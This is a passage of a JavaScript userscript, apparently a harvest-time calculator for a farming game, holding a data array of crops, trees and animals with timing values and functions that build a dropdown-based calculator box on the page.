	"Pink Roses", 46, 0, 20,
	"Pinto Foal", 23, 2, 1,
	"Pinto Horse", 69, 2, 1,
	"Plum Tree", 69, 1, 2,
	"Polar Bear Cub", 46, 2, 1,
	"Pomegranate Tree", 115, 1, 23,
	"Pony Foal", 23, 2, 1,
	"Porcupine", 46, 2, 1,
	"Posole Corn", 12, 0, 24,
	"Posole Corn", 12, 0, 54,
	"Potatoes", 69, 0, 21,
	"Prarie Dog", 46, 2, 1,
	"Pseudocorn", 69, 2, 1,
	"Puffin", 46, 2, 1,
	"Pumpkin", 8, 0, 5,
	"Purple Frog", 46, 2, 1,
	"Purple Mane Pony", 69, 2, 1,
	"Purple Pod Peas", 23, 0, 40,
	"Purple Pony Foal", 23, 2, 1,
	"Purple Poppies", 8, 0, 1,
	"Rabbit", 92, 2, 12,
	"Rainbow Apple Tree", 69, 1, 1,
	"Rappi", 23, 0, 24,
	"Raspberries", 2, 0, 8,
	"Red Clover", 6, 0, 8,
	"Red Maple Tree", 46, 1, 1,
	"Red Tulips", 23, 0, 15,
	"Red Wheat", 69, 0, 30,
	"Referee Cow", 23, 2, 1,
	"Reindeer", 46, 2, 1,
	"Rhode Island Red", 23, 2, 1,
	"Rice", 12, 0, 7,
	"Road Runner", 46, 2, 1,
	"Rye", 20, 0, 21,
	"Saanens Goat", 46, 2, 1,
	"Saffron", 10, 0, 32,
	"Scots Grey", 23, 2, 1,
	"Shamrock Sheep", 69, 2, 1,
	"Sheep Spectator", 69, 2, 1,
	"Sheep", 69, 2, 7,
	"Silver Pony", 69, 2, 1,
	"Simmental Cow", 23, 2, 1,
	"Snow Leopard", 23, 2, 1,
	"Soybeans", 23, 0, 1,
	"Spider Monkey", 46, 2, 1,
	"Squash", 46, 0, 4,
	"Stable", 69, 3, 1,
	"Starfruit Tree", 92, 1, 2,
	"Strawberries", 4, 0, 1, 
	"Sugar Beets", 12, 0, 12,
	"Sugar Cane", 8, 0, 31,
	"Sunflowers", 23, 0, 25,
	"Sunny Ewe", 69, 2, 1,
	"Swan", 46, 2, 1,
	"Swiss Chard", 14, 0, 6,
	"Tamarind Tree", 69, 1, 15,
	"Toggenburg Goat", 46, 2, 1,
	"Tomatoes", 8, 0, 20,
	"Treasure Seagull", 23, 2, 1,
	"Triticale", 23, 0, 8,
	"Turkey", 46, 2, 1,
	"Turtle", 69, 2, 1,
	"Ugly Duckling", 69, 2, 1,
	"Valley Quail", 46, 2, 1,
	"Walnut Tree", 69, 2, 11,
	"Watermelon", 92, 0, 18,
	"Wheat", 12, 0, 1,
	"White Apple Tree", 46, 1, 1,
	"White Buck", 46, 2, 1,
	"White Foal", 23, 2, 1,
	"White Grapes", 12, 0, 5,
	"White Kangaroo", 46, 2, 1,
	"White Kitty", 69, 2, 1,
	"White Lion Cub", 46, 2, 1,
	"White Peacock", 46, 2, 1,
	"White Porcupine", 46, 2, 1,
	"White Squirrel", 92, 2, 1,
	"White Stallion", 69, 2, 1,
	"Wild Turkey", 46, 2, 1,
	"Woodchuck", 46, 2, 1,
	"Yellow Maple Tree", 46, 1, 4,
	"Yellow Melon", 92, 0, 33
	);

function iList() { // Builds the item slider
  var ilist = '<td colspan="2"><select id="hc_item">';
  for (var x=0; x<item.length; x+=4 ) {
		if ((hc_cfg_var[(item[x+2]*3)+1] == "on") && (hc_cfg_var[16] >= item[x+3])) {
    	ilist += '<option value="' + x + '">' + item [x] + '</option>';
		};
  };
  return ilist += '</select></td>';
}

function pList() {  // Builds the percentage Slider
  var pList = '<td colspan="2"><select id="hc_percent">';
  for (var x=0; x<100; x++) {
    pList = pList + '<option value="' + (100-x) + '">' + x + '%</option>';
  };
  pList = pList + "</select> complete</td>";
  return pList;
}

function outField(id,value) { // Builds the individual result fields
	var outString = ( '<td><div style="text-align:right;"><b>' + id + '</b>:</td><td><div style="text-align:left;">' + value + '</td>');
	document.getElementById(id).innerHTML = outString;
}

var outFrame = '<table border="0" cellspacing="0" cellpadding="2">' + hc_logo + pv() +
  '<tr id="item_list">' + iList() + '</tr>' +
  '<tr id="percentage_list">' + pList() + '</tr>' +
	'<tr id="Current"></tr>' + 
	'<tr id="Harvest"></tr>' + 
	'<tr id="Wither"></tr>' + 
	'<tr id="Start"></tr>' + 
	'<tr id="End"></tr>' +
	'<tr><td colspan="2"  id="hc_config_area"></td></tr>' +
	'<tr><td colspan="2" id="hc_buttons">' + hc_button_config + '</td></tr>' +
	'</table>';

function hc_draw_box() {
  var outData=document.createElement("div");
  outData.setAttribute("style", "border: 1px solid rgb(59, 89, 152); padding: 2px; background: rgb(255, 255, 255) none repeat scroll 0% 0%; position: fixed; left: 2px; top: 43px;");
  outData.innerHTML=outFrame;
  document.getElementById('content').appendChild(outData);
}

hc_get_configuration_settings();
hc_draw_box();
document.getElementById('hc_percent').addEventListener('change',hc_calculate,false);
document.getElementById('hc_item').addEventListener('change',hc_calculate,false);
document.getElementById('hc_buttons').addEventListener('click',hc_button_click,false);

